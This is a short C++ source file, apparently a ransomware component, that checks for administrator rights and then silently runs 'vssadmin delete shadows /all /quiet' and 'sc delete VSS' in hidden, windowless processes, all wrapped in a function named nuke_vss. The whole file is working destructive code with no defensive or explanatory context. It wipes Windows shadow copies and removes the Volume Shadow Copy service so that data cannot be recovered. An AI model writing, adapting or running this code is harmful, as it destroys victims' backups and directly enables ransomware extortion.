#include "del_shadows.h"


void RunCommand(const wchar_t* cmd) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t cmdline[MAX_PATH];
    wcscpy_s(cmdline, cmd);

    if (!CreateProcess(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ")." << std::endl;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


void SCWipe() {
    try {
        RunCommand(L"vssadmin delete shadows /all /quiet");
    }
    catch (const std::exception& ex) {
        std::cerr << "An error occurred: " << ex.what() << std::endl;
    }
}


void WipeVSS() {
    try {
        RunCommand(L"cmd.exe /C sc delete VSS");
    }
    catch (const std::exception& ex) {
        std::cerr << "An error occurred: " << ex.what() << std::endl;
    }
}


bool IsAdministrator() {
    BOOL isAdministrator = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsGroup;
    BOOL success = AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup);

    if (success) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdministrator)) {
            isAdministrator = FALSE;
        }
        FreeSid(administratorsGroup);
    }

    return isAdministrator;
}


bool nuke_vss() {
    if (IsAdministrator()) {
        SCWipe();
        WipeVSS();
        return true;
    }
    else {
        return false;
    }
}
